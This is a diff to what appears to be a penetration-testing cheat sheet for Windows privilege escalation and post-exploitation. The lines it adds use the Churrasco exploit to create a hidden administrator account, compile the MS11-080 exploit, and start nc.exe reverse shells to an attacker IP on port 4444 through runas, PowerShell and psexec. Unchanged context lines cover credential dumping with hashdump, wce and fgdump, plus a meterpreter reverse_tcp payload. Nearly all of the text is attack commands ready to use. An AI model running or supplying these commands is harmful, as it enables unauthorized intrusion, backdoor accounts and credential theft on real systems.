@@ -458,11 +458,26 @@ set PAYLOAD linux/x86/meterpreter/reverse_tcp*
     *getsystem
 hashdump*
 
-Hash dump
+Pass the hash, hash dump
     *wce32.exe -w
 wce64.exe -w
 fgdump.exe*
 
+Useful exploits
+    Windows Server 2003 and IIS 6.0 privledge escalation using impersonation:
+    *https://www.exploit-db.com/exploits/6705/*
+    *https://github.com/Re4son/Churrasco*
+    *$ c:\Inetpub>churrasco
+ churrasco
+ /churrasco/-->Usage: Churrasco.exe [-d] "command to run"
+
+ c:\Inetpub>churrasco -d "net user /add <username> <password>"
+ c:\Inetpub>churrasco -d "net localgroup administrators <username> /add"*
+
+Windows MS11-080
+    http://www.exploit-db.com/exploits/18176/
+    *$python pyinstaller.py --onefile ms11-080.py*
+    *$ mx11-080.exe -O XP*
 
 From admin to system
     *psexec.exe -i -s %SystemRoot%\system32\cmd.exe*
@@ -495,11 +510,13 @@ return 0;
 Run as
     Windows hash format:
     *user:group:id:ntlmpassword::*
+    Technique 1:
     *C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"*
-    Powershell script:
+    Technique 2:
     *$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
 $mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
 $computer = "<hostname>"
 [System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)*
     *$ powershell -ExecutionPolicy Bypass -File c:\users\public\r.ps1*
-
+    Technique 3:
+    *$ psexec64 \\COMPUTERNAME -u Test -p test -h "c:\users\public\nc.exe -nc <attacker_ip> 4444 -e cmd.exe"*
